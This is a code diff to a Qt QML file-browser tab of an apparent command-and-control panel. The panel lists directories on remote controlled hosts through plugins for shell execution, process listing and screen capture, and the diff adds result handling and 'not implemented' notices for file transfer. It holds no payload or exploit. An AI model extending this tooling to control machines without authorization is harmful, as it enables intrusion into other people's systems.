@@ -1,6 +1,7 @@
 import QtQuick
 import QtQuick.Controls
 import QtQuick.Layouts
+import C2Panel
 
 Rectangle {
     id: fileTab
@@ -8,6 +9,7 @@ Rectangle {
     property string cookie: ""
     property string hwid: ""
     property string currentPath: "/"
+    property string notice: ""
     color: "transparent"
 
     ColumnLayout {
@@ -26,6 +28,16 @@ Rectangle {
             Button { text: "🗑 删除"; onClicked: deleteFile(); enabled: selectedRow >= 0 }
         }
 
+        // 操作反馈：让"未实现/失败"变成可见信息
+        Text {
+            Layout.fillWidth: true
+            visible: fileTab.notice.length > 0
+            text: fileTab.notice
+            color: Theme.orange
+            font.pixelSize: 12
+            wrapMode: Text.WordWrap
+        }
+
         // 文件列表
         Rectangle {
             Layout.fillWidth: true; Layout.fillHeight: true
@@ -36,12 +48,23 @@ Rectangle {
                 anchors.fill: parent; clip: true; spacing: 1
                 model: ListModel { id: fileModel }
 
-                header: RowLayout {
+                // 表头：外层的 1px 分隔线不能放在 RowLayout 里面
+                // （RowLayout 的子项由布局管理，再写 anchors 是未定义行为，
+                //   Qt 会刷 "Detected anchors on an item that is managed by a layout"）
+                header: Rectangle {
                     width: fileListView.width; height: 32
-                    Rectangle { width: parent.width; height: 1; anchors.bottom: parent.bottom; color: Qt.rgba(0,0,0,0.06) }
-                    Text { text: "名称"; width: parent.width * 0.5; font.pixelSize: 11; font.bold: true; color: Theme.textSecondary; leftPadding: 8 }
-                    Text { text: "大小"; width: parent.width * 0.2; font.pixelSize: 11; font.bold: true; color: Theme.textSecondary }
-                    Text { text: "类型"; width: parent.width * 0.3; font.pixelSize: 11; font.bold: true; color: Theme.textSecondary }
+                    color: "transparent"
+                    Rectangle {
+                        width: parent.width; height: 1
+                        anchors.bottom: parent.bottom
+                        color: Qt.rgba(0,0,0,0.06)
+                    }
+                    RowLayout {
+                        anchors.fill: parent
+                        Text { text: "名称"; Layout.preferredWidth: parent.width * 0.5; font.pixelSize: 11; font.bold: true; color: Theme.textSecondary; leftPadding: 8 }
+                        Text { text: "大小"; Layout.preferredWidth: parent.width * 0.2; font.pixelSize: 11; font.bold: true; color: Theme.textSecondary }
+                        Text { text: "类型"; Layout.preferredWidth: parent.width * 0.3; font.pixelSize: 11; font.bold: true; color: Theme.textSecondary }
+                    }
                 }
 
                 delegate: Rectangle {
@@ -82,7 +105,7 @@ Rectangle {
         pathInput.text = path
         fileModel.clear()
         selectedRow = -1
-        mcp.callTool(hwid, serverUrl, cookie, "list_directory", JSON.stringify({path: path}))
+        mcp.callTool(hwid, serverUrl, cookie, "list_directory", JSON.stringify({path: path}), "file")
     }
 
     function navigateUp() {
@@ -91,7 +114,44 @@ Rectangle {
         navigateTo(parts.join("/") || "/")
     }
 
-    function uploadFile() { /* TODO: 文件选择对话框 */ }
-    function downloadFile() { /* TODO: 下载选中文件 */ }
-    function deleteFile() { /* TODO: 确认删除 */ }
+    // 这三个操作需要被控端的 file_manager 插件（读/写/删远端文件），
+    // 当前仓库只附带 shell_exec / process_list / screen_capture 三个插件，
+    // 因此这里明确告知"缺什么"，而不是留一个点了没反应的按钮。
+    function uploadFile() {
+        notice = "上传未实现：需要被控端的 file_manager 插件（本项目未附带）"
+        console.log(notice)
+    }
+    function downloadFile() {
+        notice = "下载未实现：需要被控端的 file_manager 插件（本项目未附带）"
+        console.log(notice)
+    }
+    function deleteFile() {
+        notice = "删除未实现：需要被控端的 file_manager 插件（本项目未附带）"
+        console.log(notice)
+    }
+
+    // 消费 list_directory 的结果：原来整个文件没有任何 Connections，
+    // fileModel 只 clear 不 append，文件页永远是空的
+    Connections {
+        target: mcp
+        function onToolResult(tool, result, source) {
+            if (source !== "file" && tool !== "list_directory") return
+            var obj = null
+            try { obj = JSON.parse(result) } catch (e) { notice = "结果解析失败: " + result; return }
+            if (obj.error !== undefined) { notice = "[error] " + obj.error; return }
+            var list = obj.files
+            if (!list && obj.content && obj.content[0] && obj.content[0].text) {
+                try { var inner = JSON.parse(obj.content[0].text); list = inner.files } catch (e) { list = null }
+            }
+            if (!list) { notice = "该工具未返回文件列表（需要 file_manager 插件）"; return }
+            notice = ""
+            fileModel.clear()
+            for (var i = 0; i < list.length; ++i) {
+                var f = list[i]
+                fileModel.append({ name: f.name, size: f.size || 0,
+                                   isDir: f.is_dir === true, modTime: f.mod_time || "" })
+            }
+            selectedRow = -1
+        }
+    }
 }
